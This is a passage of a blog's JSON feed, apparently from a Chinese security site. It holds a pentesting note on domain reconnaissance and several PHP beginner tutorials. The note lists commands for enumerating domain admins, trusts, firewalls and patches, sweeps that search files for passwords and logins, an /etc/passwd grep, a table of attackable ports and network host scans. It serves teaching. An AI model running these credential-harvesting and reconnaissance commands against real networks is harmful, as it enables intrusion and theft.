Admins” 组的成员</h4>\n<p><code>net group &quot;domain admins&quot; /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142138340.png\" alt=\"image-20240304142138340\"></p>\n<h4 id=\"查询域时间主域名\"><a class=\"markdownIt-Anchor\" href=\"#查询域时间主域名\">#</a> 查询域时间主域名</h4>\n<p><code>net time /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142231136.png\" alt=\"image-20240304142231136\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hZDAxLXVoNWZmNDQ1aHN1aC55dW55aS5pbw==\">主域名为 ad01.yunyi.io</span></p>\n<h4 id=\"查arp缓存\"><a class=\"markdownIt-Anchor\" href=\"#查arp缓存\">#</a> 查 ARP 缓存</h4>\n<p><code>arp -a</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142335688.png\" alt=\"image-20240304142335688\"></p>\n<h4 id=\"查环境变量\"><a class=\"markdownIt-Anchor\" href=\"#查环境变量\">#</a> 查环境变量</h4>\n<p><code>set</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142615252.png\" alt=\"image-20240304142615252\"></p>\n<h4 id=\"查看安装软件的版本信息\"><a class=\"markdownIt-Anchor\" href=\"#查看安装软件的版本信息\">#</a> 查看安装软件的版本信息</h4>\n<p><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143132821.png\" alt=\"image-20240304143132821\"></p>\n<h4 id=\"域信任列表信息\"><a class=\"markdownIt-Anchor\" href=\"#域信任列表信息\">#</a> 域信任列表信息</h4>\n<p><code>nltest /domain_trusts</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143407722.png\" alt=\"image-20240304143407722\"></p>\n<h4 id=\"防火墙配置信息\"><a class=\"markdownIt-Anchor\" href=\"#防火墙配置信息\">#</a> 防火墙配置信息</h4>\n<p><code>netsh firewall show config</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143537981.png\" alt=\"image-20240304143537981\"></p>\n<h4 id=\"网络详细信息\"><a class=\"markdownIt-Anchor\" href=\"#网络详细信息\">#</a> 网络详细信息</h4>\n<p><code>ipconfig /all</code> <span class=\"exturl\" data-url=\"aHR0cDovL3huLS15dW55aS02bzZoaThocDRraDAwYjJwN2EuaW8=\"> 可看到有域 yunyi.io</span></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143755101.png\" alt=\"image-20240304143755101\"></p>\n<h4 id=\"查看网络端口信息\"><a class=\"markdownIt-Anchor\" href=\"#查看网络端口信息\">#</a> 查看网络端口信息</h4>\n<p><code>netstat -ano</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144042633.png\" alt=\"image-20240304144042633\"></p>\n<h4 id=\"查杀软查提权\"><a class=\"markdownIt-Anchor\" href=\"#查杀软查提权\">#</a> 查杀软查提权</h4>\n<p><code>tasklist</code>  查看当前计算机上所有进程的列表</p>\n<p><code>systeminfo</code></p>\n<p>查完补丁信息可以去<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4vJUU2JTlGJUE1JUU4JUFGJUEy\"> https://i.hacking8.com/tiquan/ 查询</span></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144509958.png\" alt=\"image-20240304144509958\"></p>\n<p>获取系统运行软件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144622209.png\" alt=\"image-20240304144622209\"></p>\n<p>识别杀软</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144943521.png\" alt=\"image-20240304144943521\"></p>\n<p>查询当前工作环境</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304145111793.png\" alt=\"image-20240304145111793\"></p>\n<h3 id=\"敏感文件密码收集\"><a class=\"markdownIt-Anchor\" href=\"#敏感文件密码收集\">#</a> 敏感文件密码收集</h3>\n<pre><code class=\"language-cmd\">#指定目录下搜集各类敏感文件\ndir /a /s /b d:\\&quot;*.txt&quot;\ndir /a /s /b d:\\&quot;*.xml&quot;\ndir /a /s /b d:\\&quot;*.mdb&quot;\ndir /a /s /b d:\\&quot;*.sql&quot;\ndir /a /s /b d:\\&quot;*.mdf&quot;\ndir /a /s /b d:\\&quot;*.eml&quot;\ndir /a /s /b d:\\&quot;*.pst&quot;\ndir /a /s /b d:\\&quot;*conf*&quot;\ndir /a /s /b d:\\&quot;*bak*&quot;\ndir /a /s /b d:\\&quot;*pwd*&quot;\ndir /a /s /b d:\\&quot;*pass*&quot;\ndir /a /s /b d:\\&quot;*login*&quot;\ndir /a /s /b d:\\&quot;*user*&quot;\nfindstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak\nfindstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak\nfindstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak\nfindstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak\nfindstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak\n\n\nfind /etc/ -name passwd -exec grep &quot;root&quot; &#123;&#125; \\; &gt; /tmp/test.txt\nfind /etc/ -name passwd -exec grep -H &quot;root&quot; &#123;&#125; \\;\n/etc/passwd:root:x:0:0:root:/root:/bin/bash\n/etc/passwd:operator:x:11:0:operator:/root:/sbin/nologin\n</code></pre>\n<h3 id=\"易受攻击的常见端口\"><a class=\"markdownIt-Anchor\" href=\"#易受攻击的常见端口\">#</a> 易受攻击的常见端口</h3>\n<p>80 / 8080     <strong>HTTP</strong>         　　　　　　　　　　　　　　　　　　　　　Web 攻击 \\ 爆破 \\ 对应服务器版本漏洞</p>\n<p>443            <strong>HTTPS</strong>                                                同上</p>\n<p>7001/7002      <strong>WebLogic 控制台</strong>　　　　　　　　　　　　　　　　　　　　　　java 反序列化 \\ 弱口令</p>\n<p>8080 /8089     <strong>Jboss/Resin/Jetty/Jenkins</strong>    　　　　　　　　　　　　　　　反序列化 \\ 控制台弱口令</p>\n<p>9090          <strong>WebSphere 控制台</strong>       　　　　　　　　　　　　　　　　　java 反序列化 \\ 弱口令</p>\n<p>4848          <strong>GlassFish</strong> 控制台       　　　　　　　　　　　　　　　　　弱口令</p>\n<p>1352          <strong>Lotus domino</strong> 邮件服务                                  弱口令 \\ 信息泄露 \\ 爆破</p>\n<p>10000         <strong>Webmin-Web</strong> 控制面板                                  弱口令</p>\n<p>3306         <strong>MySQL</strong>　　                                           注入 \\ 提权 \\ 爆破</p>\n<p>1433         <strong>SQLserver</strong>                                           注入 \\ 提权 \\SA 弱口令 \\ 爆破</p>\n<p>1521          <strong>Oracle</strong> 数据库                                         TNS 爆破 \\ 注入 \\ 反弹 Shell</p>\n<p>5432          PostgreSQL 数据库                                    爆破 \\ 注入 \\ 弱口令</p>\n<p>27017 / 27018  MongoDB                                            爆破 \\ 未授权访问</p>\n<p>6379           Redis 数据库                                          可尝试未授权访问 \\ 弱口令爆破</p>\n<p>5000          SysBase/DB2 数据库                                   爆破 \\ 注入</p>\n<p>25          <strong>SMTP</strong> 邮件服务                                   邮件伪造</p>\n<p>110         <strong>POP3</strong> 协议                                       爆破 \\ 嗅探</p>\n<p>143         <strong>IMAP</strong> 协议                                       爆破</p>\n<p>53         <strong>DNS</strong> 域名系统                                   允许区域传送 \\DNS 劫持 \\ 缓存投毒 \\ 欺骗</p>\n<p>67 / 68      <strong>DHCP</strong> 服务                                      劫持 \\ 欺骗</p>\n<p>161        <strong>SNMP</strong> 协议                                      爆破 \\ 搜集目标内网信息</p>\n<p>2181        <strong>Zookeeper</strong> 服务                                   未授权访问</p>\n<p>8069         <strong>Zabbix</strong> 服务                                      远程执行 \\ SQL 注入</p>\n<p>9200 /9300   <strong>Elasticsearch</strong> 服务                                远程执行</p>\n<p>11211        <strong>Memcache</strong> 服务                                 未授权访问</p>\n<p>512 / 513 /514  <strong>Linux Rexec</strong> 服务                                爆破 \\ Rlogin 登陆</p>\n<p>873          <strong>Rsync</strong> 服务                                      匿名访问 \\ 文件上传</p>\n<p>3690        <strong>Svn</strong> 服务                                        Svn 泄露 \\ 未授权访问</p>\n<p>50000         <strong>SAP Management Console</strong>                                远程执行</p>\n<h3 id=\"存活主机探测\"><a class=\"markdownIt-Anchor\" href=\"#存活主机探测\">#</a> 存活主机探测</h3>\n<h4 id=\"icmp协议探测\"><a class=\"markdownIt-Anchor\" href=\"#icmp协议探测\">#</a> icmp 协议探测</h4>\n<p>win</p>\n<p><code>for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</code></p>\n<p>linux</p>\n<p><code>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; '&#123;print $4&#125;'; done</code></p>\n<p>但是速度太慢</p>\n<h4 id=\"invoke-tspingsweepps1\"><a class=\"markdownIt-Anchor\" href=\"#invoke-tspingsweepps1\">#</a> Invoke-TSPingSweep.ps1</h4>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>powershell.exe -exec bypass -Command \"Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135\"</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194141615.png\" alt=\"image-20240304194141615\"></p>\n<h4 id=\"arp-scan\"><a class=\"markdownIt-Anchor\" href=\"#arp-scan\">#</a> ARP-scan</h4>\n<p><code>arp-scan -t 10.10.10.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194058816.png\" alt=\"image-20240304194058816\"></p>\n<h4 id=\"nbtscan\"><a class=\"markdownIt-Anchor\" href=\"#nbtscan\">#</a> nbtscan</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy51bml4d2l6Lm5ldC90b29scy9uYnRzY2FuLmh0bWw=\">http://www.unixwiz.net/tools/nbtscan.html</span></p>\n<p><code>nbtscan 10.10.10.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304221708922.png\" alt=\"image-20240304221708922\"></p>\n<h4 id=\"tcping\"><a class=\"markdownIt-Anchor\" href=\"#tcping\">#</a> tcping</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGlmdWxrZXJzb24uY29tL3Byb2plY3RzL3RjcGluZy5waHA=\">https://elifulkerson.com/projects/tcping.php</span></p>\n<p><code>tcping -n ip 端口</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222152734.png\" alt=\"image-20240304222152734\"></p>\n<h4 id=\"fscan\"><a class=\"markdownIt-Anchor\" href=\"#fscan\">#</a> fscan</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvdzFuZy9mc2Nhbg==\">https://github.com/shadow1ng/fscan</span></p>\n<p>fscan.exe -h 10.10.10.1-255 -p 22,445</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222456424.png\" alt=\"image-20240304222456424\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/02/19/network-security/Cloud-Security/%E5%85%AC%E6%9C%89%E4%BA%91/",
            "url": "http://gyzero.shop/2024/02/19/network-security/Cloud-Security/%E5%85%AC%E6%9C%89%E4%BA%91/",
            "title": "公有云",
            "date_published": "2024-02-19T07:32:52.000Z",
            "content_html": "<p>公有云介绍</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/",
            "url": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/PHP%E8%BF%90%E7%AE%97%E7%AC%A6/",
            "title": "PHP运算符",
            "date_published": "2023-12-12T09:08:36.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E5%B8%B8%E9%87%8F/PHP%E5%B8%B8%E9%87%8F/",
            "url": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E5%B8%B8%E9%87%8F/PHP%E5%B8%B8%E9%87%8F/",
            "title": "PHP常量",
            "date_published": "2023-12-12T09:00:23.000Z",
            "content_html": "<p>在 PHP 中，常量是不可变的标识符（名称），用于表示一个简单值的容器。常量一旦定义后，在脚本的其余部分无法更改或重新定义。以下是有关 PHP 常量的详细信息：</p>\n<h3 id=\"定义常量\"><a class=\"markdownIt-Anchor\" href=\"#定义常量\">#</a> 定义常量</h3>\n<p>在 PHP 中，有两种定义常量的方式：</p>\n<ol>\n<li>使用  <code>define()</code>  函数：</li>\n</ol>\n<pre><code class=\"language-PHP\">&lt;?php\ndefine(&quot;CONSTANT_NAME&quot;, &quot;constant_value&quot;);\necho CONSTANT_NAME;\n?&gt;\n</code></pre>\n<p>使用  <code>const</code>  关键字（PHP 5.3 及以上版本）在类中定义常量：</p>\n<ol>\n<li>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MyClass</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">PI</span> <span class=\"token operator\">=</span> <span class=\"token number\">3.14</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">APP_NAME</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"MyApp\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token class-name static-context\">MyClass</span><span class=\"token operator\">::</span><span class=\"token constant\">PI</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token class-name static-context\">MyClass</span><span class=\"token operator\">::</span><span class=\"token constant\">APP_NAME</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"常量命名规则\"><a class=\"markdownIt-Anchor\" href=\"#常量命名规则\">#</a> 常量命名规则</h3>\n<ul>\n<li>常量名称通常使用大写字母。</li>\n<li>常量名称可以包含字母、数字和下划线（但不能以数字开头）。</li>\n<li>常量名称是区分大小写的（与变量不同）。</li>\n</ul>\n<h3 id=\"访问常量\"><a class=\"markdownIt-Anchor\" href=\"#访问常量\">#</a> 访问常量</h3>\n<p>无论是使用  <code>define()</code>  定义的常量还是在类中使用  <code>const</code>  定义的常量，都可以通过常量名称来访问。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token constant\">CONSTANT_NAME</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token class-name static-context\">MyClass</span><span class=\"token operator\">::</span><span class=\"token constant\">PI</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"预定义常量\"><a class=\"markdownIt-Anchor\" href=\"#预定义常量\">#</a> 预定义常量</h3>\n<p>PHP 还提供了一些预定义常量，这些常量可供直接使用，无需定义。</p>\n<ul>\n<li><code>PHP_VERSION</code> ：PHP 当前版本。</li>\n<li><code>PHP_OS</code> ：PHP 运行的操作系统。</li>\n<li><code>__FILE__</code> ：当前文件的路径和文件名。</li>\n<li><code>__LINE__</code> ：当前代码行号。</li>\n<li><code>__CLASS__</code> ：当前类的类名。</li>\n<li><code>__FUNCTION__</code> ：当前函数的函数名。</li>\n</ul>\n<h3 id=\"删除常量\"><a class=\"markdownIt-Anchor\" href=\"#删除常量\">#</a> 删除常量</h3>\n<p>在 PHP 中，无法删除已定义的常量。一旦定义，常量就会在脚本的其余部分保持不变。</p>\n<p>常量在编写 PHP 代码时非常有用，用于存储不变的值，如配置信息、常用数学常数等。</p>\n<h3 id=\"常量的特点\"><a class=\"markdownIt-Anchor\" href=\"#常量的特点\">#</a> 常量的特点</h3>\n<ul>\n<li><strong>不可变性</strong>：常量一旦被定义就无法被修改或重新定义。</li>\n<li><strong>全局性</strong>：使用  <code>define()</code>  定义的常量在整个脚本中均可访问。</li>\n<li><strong>编译时计算</strong>：常量的值在编译时确定，不能在运行时修改。</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/PHP%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/",
            "url": "http://gyzero.shop/2023/12/12/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHP%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/PHP%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/",
            "title": "PHP类型比较",
            "date_published": "2023-12-12T08:45:35.000Z",
            "content_html": "<h3 id=\"php-类型比较\"><a class=\"markdownIt-Anchor\" href=\"#php-类型比较\">#</a> PHP 类型比较</h3>\n<p>在 PHP 中，有不同的方式可以进行类型比较。这些比较方式包括：</p>\n<p><strong>松散比较</strong>（Loose comparison）：使用双等号  <code>==</code>  进行比较。在松散比较中，PHP 会尝试进行类型转换，然后再比较值。例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// int</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'10'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// string</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 这里的条件为真，因为在松散比较中，PHP 会将字符串 '10' 转换为整数 10，然后进行比较</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><strong>严格比较</strong>（Strict comparison）：使用三个等号  <code>===</code>  进行比较。在严格比较中，PHP 不会进行类型转换，它会比较值和类型。如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// int</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'10'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// string</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 这里的条件为假，因为在严格比较中，类型不同（int 和 string），所以条件不成立</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"不等于-和-不全等于\"><a class=\"markdownIt-Anchor\" href=\"#不等于-和-不全等于\">#</a> 不等于  <code>!=</code>  和 不全等于  <code>!==</code></h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// int</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'10'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// string</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 在不等于比较中，条件为假，因为 '10' 会被转换为整数 10</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 在不全等于比较中，条件为真，因为类型不同（int 和 string）</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/",
            "url": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/",
            "title": "php数据类型",
            "date_published": "2023-11-16T12:33:47.000Z",
            "content_html": "<p><strong>String（字符串）</strong>：用于表示文本数据的数据类型，使用单引号或双引号括起来。</p>\n<p><strong>Integer（整数）</strong>：用于表示整数值，可以是正数、负数或零。</p>\n<p><strong>Float（浮点数）</strong>：用于表示带有小数部分的数值。</p>\n<p><strong>Boolean（布尔值）</strong>：用于表示 true 或 false 两种状态。</p>\n<p><strong>Array（数组）</strong>：用于存储多个值的集合，可以是索引数组或关联数组。</p>\n<p><strong>Object（对象）</strong>：用于存储数据和操作的实例。</p>\n<p><strong>NULL（空值）</strong>：用于表示变量没有值。</p>\n<p><strong>Resource（资源）</strong>：特殊数据类型，表示外部资源（如数据库连接）的引用。</p>\n<h3 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> 字符串</h3>\n<p>字符串通过双引号单引号包裹</p>\n<p>使用双引号  <code>&quot;&quot;</code>  括起来的文本。双引号字符串允许解析变量和转义字符。</p>\n<p>字符串还支持转义字符，例如：</p>\n<ul>\n<li><code>\\n</code> : 换行符</li>\n<li><code>\\t</code> : 制表符</li>\n<li><code>\\\\</code> : 反斜杠</li>\n<li><code>\\&quot;</code> : 双引号</li>\n<li><code>\\'</code> : 单引号</li>\n<li>字符串也支持连接操作符  <code>.</code>  用于连接两个字符串：</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'字符串-1234-GGGG'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你好\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"burp\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h4 id=\"字符串处理\"><a class=\"markdownIt-Anchor\" href=\"#字符串处理\">#</a> 字符串处理</h4>\n<p>在 PHP 中，有许多内置函数用于处理字符串。这些函数可以用于查找、截取、替换、转换大小写等操作。</p>\n<ol>\n<li><strong>strlen()</strong>：获取字符串长度。</li>\n<li><strong>strpos()</strong>：查找子串在字符串中第一次出现的位置。</li>\n<li><strong>substr()</strong>：从字符串中提取子串。</li>\n<li><strong>str_replace()</strong>：替换字符串中的部分内容。</li>\n<li><strong>strtoupper() / strtolower()</strong>：将字符串转换为大写 / 小写。</li>\n<li><strong>trim()</strong>：去除字符串两端的空格或特定字符。</li>\n<li><strong>explode()</strong> / <strong>implode()</strong>：将字符串拆分为数组 / 将数组元素连接成字符串。</li>\n<li><strong>printf() / sprintf()</strong>：格式化字符串输出。</li>\n<li><strong>str_split()</strong>：将字符串拆分为字符数组</li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>// strlen()函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string 